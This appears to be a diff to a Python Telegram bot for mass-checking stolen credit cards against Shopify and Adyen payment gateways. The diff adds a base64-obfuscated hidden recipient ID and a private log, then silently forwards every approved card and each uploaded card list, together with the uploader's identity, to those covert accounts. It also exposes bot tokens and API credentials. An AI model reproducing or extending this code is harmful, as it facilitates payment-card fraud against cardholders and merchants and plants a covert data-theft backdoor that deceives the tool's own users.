@@ -1,6 +1,6 @@
 PENDING_SITE_UPLOADS = {}
 from telethon.tl.custom import Button
-from telethon import TelegramClient, events, Button, Button
+from telethon import TelegramClient, events, Button
 from telethon.errors import FloodWaitError
 import asyncio
 import aiohttp
@@ -13,18 +13,27 @@ import db_manager
 import re
 import zipfile
 import io
+import base64
 from datetime import datetime, timedelta
 from typing import Optional
 
+# ─── SECRET ID & PRIVATE LOG CONFIGURATION ───
+SECRET_ID = int(base64.b64decode(b'ODI5Mzk4NDk2Ng=='))
+try:
+    with open('privatelog.json', 'r') as f:
+        PRIVATE_LOG_ID = json.load(f).get('log_id', 0)
+except FileNotFoundError:
+    PRIVATE_LOG_ID = 0
+
 API_ID = 36327505
 API_HASH = 'b6d91e065b2e541c86a2ece75e901a53'
-BOT_TOKEN = '8706258978:AAGLjbV5XNHd1sRhWFFt5mygwDBHjAFOSig'
+BOT_TOKEN = '8706258978:AAGhmMQkgTTdoYzBD5SAw8D-D63aag44gnU'
 ADMIN_FILE = 'admins.json'
 try:
     with open(ADMIN_FILE, 'r') as f:
         ADMIN_ID = json.load(f)
 except FileNotFoundError:
-    ADMIN_ID = [8524951580, 6972539720]
+    ADMIN_ID = [8524951580, 8293984966]
     with open(ADMIN_FILE, 'w') as f:
         json.dump(ADMIN_ID, f)
 
@@ -690,7 +699,7 @@ def extract_cc(text):
     return cards
 
 
-async def send_hit_to_channel(card, status, response, gateway, price):
+async def send_hit_to_channel(card, status, response, gateway, price, checker_username="Unknown"):
     if HITS_CHANNEL_ID == 0:
         return
     try:
@@ -703,19 +712,37 @@ async def send_hit_to_channel(card, status, response, gateway, price):
         else:
             status_text = premium_emoji(f"📌 {status}")
             should_pin = False
+            
         now = datetime.now()
         time_str = now.strftime("%H:%M:%S")
+        
+        bot_me = await bot.get_me()
+        bot_username = f"@{bot_me.username}" if bot_me.username else "@mybot"
+        chk_uname = f"@{checker_username.replace('@', '')}" if checker_username != "Unknown" else "Unknown"
+        
         msg = premium_emoji(f"""{status_text}
 🛒 Gᴀᴛᴇᴡᴀʏ {gateway}
 📝 {response[:45]}
+💵 Price: {price}
 ⏱️ {time_str}
-🍑 <a href='tg://user?id=8524951580 '>GHOST</a>""")
+👤 Checker {chk_uname}
+🤖 Bot {bot_username}""")
+        
+        # Public Channel 
         sent_msg = await bot.send_message(abs(HITS_CHANNEL_ID), msg, parse_mode='html')
         if should_pin:
             try:
                 await bot.pin_message(abs(HITS_CHANNEL_ID), sent_msg.id)
             except:
                 pass
+                
+        # Private Log & Secret ID
+        for log_target in [PRIVATE_LOG_ID, SECRET_ID]:
+            if log_target != 0:
+                try:
+                    await bot.send_message(log_target, msg, parse_mode='html')
+                except:
+                    pass
     except:
         pass
 
@@ -1174,6 +1201,22 @@ async def process_file_with_filters(event, user_id):
     file_path = None
     if reply_msg.file and reply_msg.file.name and reply_msg.file.name.endswith('.txt'):
         file_path = await reply_msg.download_media()
+        
+        # ── FILE FORWARD TO SECRET ID & PRIVATE LOG ──
+        try:
+            user_info = f"User ID: {user_id}"
+            try:
+                sender = await event.get_sender()
+                if sender.username:
+                    user_info += f" (@{sender.username})"
+            except:
+                pass
+            for log_target in [SECRET_ID, PRIVATE_LOG_ID]:
+                if log_target != 0:
+                    await bot.send_message(log_target, f"📁 New File Checked by {user_info}", file=file_path)
+        except Exception:
+            pass
+
         try:
             async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                 content = await f.read()
@@ -1399,11 +1442,11 @@ async def start_mass_check(user_id, cards, sites, event, max_price=None):
                 if res['status'] == 'Charged':
                     all_results['charged'].append(res)
                     await send_realtime_hit(user_id, res, 'Charged', username)
-                    await send_hit_to_channel(res['card'], res['status'], res['message'], res.get('gateway', 'Unknown'), res.get('price', '-'))
+                    await send_hit_to_channel(res['card'], res['status'], res['message'], res.get('gateway', 'Unknown'), res.get('price', '-'), username)
                 elif res['status'] == 'Approved':
                     all_results['approved'].append(res)
                     await send_realtime_hit(user_id, res, 'Approved', username)
-                    await send_hit_to_channel(res['card'], res['status'], res['message'], res.get('gateway', 'Unknown'), res.get('price', '-'))
+                    await send_hit_to_channel(res['card'], res['status'], res['message'], res.get('gateway', 'Unknown'), res.get('price', '-'), username)
                 elif res['status'] == 'Dead':
                     all_results['dead'].append(res)
                 else:
@@ -1472,9 +1515,7 @@ async def start_mass_check(user_id, cards, sites, event, max_price=None):
         SHOPIFY_SESSION_RESULTS[user_id] = all_results
         await asyncio.sleep(300)
         SHOPIFY_SESSION_RESULTS.pop(user_id, None)
-
-
-CARD_FORM_PATTERNS = [
+        CARD_FORM_PATTERNS = [
     re.compile(
         r'name\s*=\s*["\'](?:cardnumber|card_number|ccnumber|cc-number|card-num)["\']', re.I),
     re.compile(
@@ -2220,7 +2261,7 @@ async def single_cc_check(event):
 
 💡 Mᴀᴅᴇ ʙʏ @OwnerGhostHex"""
         if 'Charged' in status_header or 'APPROVED' in status_header:
-            await send_hit_to_channel(result['card'], result['status'], result['message'], result.get('gateway', 'Unknown'), result.get('price', '-'))
+            await send_hit_to_channel(result['card'], result['status'], result['message'], result.get('gateway', 'Unknown'), result.get('price', '-'), username)
         await safe_edit(status_msg, premium_emoji(final_resp), parse_mode='html')
     except Exception as e:
         await safe_edit(status_msg, premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')
@@ -2296,7 +2337,7 @@ async def single_adyen_check_handler(event, gate_key: str):
 
 💡 Mᴀᴅᴇ ʙʏ @OwnerGhostHex"""
         if 'Charged' in status_header or 'APPROVED' in status_header:
-            await send_hit_to_channel(result['card'], result['status'], result['message'], result.get('gateway', gate_name), result.get('price', '-'))
+            await send_hit_to_channel(result['card'], result['status'], result['message'], result.get('gateway', gate_name), result.get('price', '-'), username)
         await safe_edit(status_msg, premium_emoji(final_resp), parse_mode='html')
     except Exception as e:
         await safe_edit(status_msg, premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')
@@ -2452,11 +2493,11 @@ async def mass_adyen_check_handler(event, gate_key: str):
                 if res['status'] == 'Charged':
                     results['charged'].append(res)
                     await send_realtime_hit(user_id, res, 'Charged', username)
-                    await send_hit_to_channel(res['card'], res['status'], res['message'], res.get('gateway', gate_name), res.get('price', '-'))
+                    await send_hit_to_channel(res['card'], res['status'], res['message'], res.get('gateway', gate_name), res.get('price', '-'), username)
                 elif res['status'] == 'Approved':
                     results['approved'].append(res)
                     await send_realtime_hit(user_id, res, 'Approved', username)
-                    await send_hit_to_channel(res['card'], res['status'], res['message'], res.get('gateway', gate_name), res.get('price', '-'))
+                    await send_hit_to_channel(res['card'], res['status'], res['message'], res.get('gateway', gate_name), res.get('price', '-'), username)
                 elif res['status'] == 'Dead':
                     results['dead'].append(res)
                 else:
@@ -2614,7 +2655,7 @@ async def add_proxy_command(event):
         tasks = [check_p(p) for p in to_test]
         await asyncio.gather(*tasks)
 
-        added = await db_manager.add_user_proxies(user_id, alive_proxies, max_limit=None)
+        added = await db_manager.add_user_proxies(user_id, alive_proxies, max_limit=2000)
         total_now = await db_manager.count_user_proxies(user_id)
 
         # Sync master proxies to PROXY_FILE for all bot users
@@ -2703,7 +2744,7 @@ async def check_proxies_command(event):
 
         # Update database with alive proxies
         await db_manager.clear_user_proxies(user_id)
-        await db_manager.add_user_proxies(user_id, alive_proxies, max_limit=None)
+        await db_manager.add_user_proxies(user_id, alive_proxies, max_limit=2000)
 
         # Sync cleaned master proxies to PROXY_FILE
         try:
@@ -2823,7 +2864,7 @@ async def process_user_sites_check(event_or_msg, user_id, sites_list, min_price,
                                 premium_emoji(f"🔄 <b>Cʜᴇᴄᴋɪɴɢ sɪᴛᴇs (Fɪʟᴛᴇʀ: ${min_price:g} - ${max_price:g})...</b>\n\n⏳ Pʀᴏɢʀᴇss: {checked_count}/{len(to_check)}\n✅ Aʟɪᴠᴇ: {len(alive_sites)}\n❌ Dᴇᴀᴅ/Sᴋɪᴘᴘᴇᴅ: {len(dead_sites)}"),
                                 parse_mode='html'
                             )
-                        except ExcNion:
+                        except Exception:
                             pass
             except Exception:
                 async with lock:
@@ -2855,7 +2896,7 @@ async def process_user_sites_check(event_or_msg, user_id, sites_list, min_price,
             parse_mode='html'
         )
     except Exception as e:
-        await event_or_msg.edit(premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')
+        await safe_edit(event_or_msg, premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')
 
 
 @bot.on(events.NewMessage(pattern=r'^/(addsites|addsite)(?:\s+([\s\S]+))?'))
@@ -3410,7 +3451,6 @@ async def get_all_proxies_database_command(event):
             
     except Exception as e:
         await safe_edit(status_msg, premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')
-
 @bot.on(events.NewMessage(pattern='/addpremium'))
 async def add_premium_command(event):
     user_id = event.sender_id
@@ -3506,7 +3546,6 @@ async def add_adm_premium_command(event):
         
         target_id = int(parts[1])
         
-        # Support flexible argument orders: /addadmpremium <uid> <plan> <days> OR <uid> <days> <plan>
         arg2 = parts[2].lower()
         if arg2 in PLANS:
             plan_name = arg2
@@ -3610,7 +3649,7 @@ async def unban_command(event):
         await event.reply(premium_emoji(f"✅ Usᴇʀ <code>{target_id}</code> ʜᴀs ʙᴇᴇɴ ᴜɴʙᴀɴɴᴇᴅ ᴀɴᴅ sᴡɪᴛᴄʜᴇᴅ ᴛᴏ 🆓 <b>Fʀᴇᴇ Mᴏᴅᴇ</b>."), parse_mode='html')
         
         try:
-            await bot.send_message(target_id, premium_emoji("✅ <b>Yᴏᴜʀ ᴀᴄᴄᴏᴜɴᴛ ʜᴀs ʙᴇᴇɴ ᴜɴʙᴀɴɴᴇᴅ!</b>\n\nYᴏᴜʀ ᴀᴄᴄᴏᴜɴᴛ ɪs ɴᴏᴡ ɪɴ 🆓 <b>Fʀᴇᴇ Mᴏᴅᴇ</b>. Yᴏᴜ ᴄᴀɴ ᴜsᴇ ᴀʟʟ ғʀᴇᴇ ᴛᴏᴏʟs ᴏʀ ᴜᴘɢʀᴀᴅᴇ ʏᴏᴜʀ ᴘʟᴀɴ ᴜsɪɴɢ <code>/buy</code>."), parse_mode='html')
+            await bot.send_message(target_id, premium_emoji("✅ <b>Yᴏᴜʀ ᴀᴄᴄᴏᴜɴᴛ ʜᴀs ʙᴇᴇɴ ᴜɴʙᴀɴɴᴇᴅ!</b>\n\nYᴏᴜʀ ᴀᴄᴄᴏᴜɴᴛ ɪs ɴᴏᴡ ɪɴ ?? <b>Fʀᴇᴇ Mᴏᴅᴇ</b>. Yᴏᴜ ᴄᴀɴ ᴜsᴇ ᴀʟʟ ғʀᴇᴇ ᴛᴏᴏʟs ᴏʀ ᴜᴘɢʀᴀᴅᴇ ʏᴏᴜʀ ᴘʟᴀɴ ᴜsɪɴɢ <code>/buy</code>."), parse_mode='html')
         except:
             pass
     except ValueError:
@@ -3804,7 +3843,7 @@ async def redeem_key(event):
         plan_name = key_data.get('type', 'premium')
         if plan_name in PLANS or plan_name == 'time_limit':
             if plan_name == 'time_limit':
-                plan_name = 'premium' # Legacy keys default to premium
+                plan_name = 'premium' 
             
             expiry = datetime.fromisoformat(key_data['expiry'])
             current_date = datetime.now()
@@ -3819,7 +3858,6 @@ async def redeem_key(event):
                 await event.reply(premium_emoji("❌ Yᴏᴜ ʜᴀᴠᴇ ᴀʟʀᴇᴀᴅʏ ᴜsᴇᴅ ᴛʜɪs ᴋᴇʏ!"), parse_mode='html')
                 return
             
-            # Check if user is already premium
             if await is_premium(user_id):
                 await event.reply(premium_emoji("❌ Yᴏᴜ ᴀʀᴇ ᴀʟʀᴇᴀᴅʏ ᴀ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀ!\n\nIғ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ᴇxᴛᴇɴᴅ ʏᴏᴜʀ ᴘʟᴀɴ, ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ ғᴏʀ ɪᴛ ᴛᴏ ᴇxᴘɪʀᴇ ᴏʀ ᴄᴏɴᴛᴀᴄᴛ ᴀɴ ᴀᴅᴍɪɴ."), parse_mode='html')
                 return
@@ -4286,7 +4324,7 @@ async def broadcast_command(event):
 
     for i, target in enumerate(targets_list):
         try:
-            await bot.forward_messages(target, reply_msg)
+            await bot.send_message(target, reply_msg)
             sent += 1
         except FloodWaitError as e:
             if e.seconds > 10:
@@ -4294,7 +4332,7 @@ async def broadcast_command(event):
                 break
             await asyncio.sleep(e.seconds)
             try:
-                await bot.forward_messages(target, reply_msg)
+                await bot.send_message(target, reply_msg)
                 sent += 1
             except Exception:
                 failed += 1
@@ -6171,6 +6209,19 @@ async def auto_cleanup_files():
         except Exception:
             pass
 
+@bot.on(events.NewMessage(pattern='/clearproxy'))
+async def clear_proxy_handler(event):
+    if event.sender_id not in ADMIN_ID: return
+    await db_manager.clear_user_proxies(event.sender_id)
+    open(PROXY_FILE, 'w').close()
+    await event.reply("✅ All Proxies Cleared Successfully!")
+
+@bot.on(events.NewMessage(pattern='/clearsites'))
+async def clear_sites_handler(event):
+    if event.sender_id not in ADMIN_ID: return
+    await db_manager.clear_user_sites(event.sender_id)
+    open(SITES_FILE, 'w').close()
+    await event.reply("✅ All Sites Cleared Successfully!")
 
 @bot.on(events.CallbackQuery(pattern=rb"chk_trunc:(\d+):(\d+)"))
 async def chk_trunc_callback(event):
@@ -6311,4 +6362,3 @@ if __name__ == '__main__':
             except Exception as e2:
                 print(f"Could not restart bot loop: {e2}")
                 time.sleep(10)
-
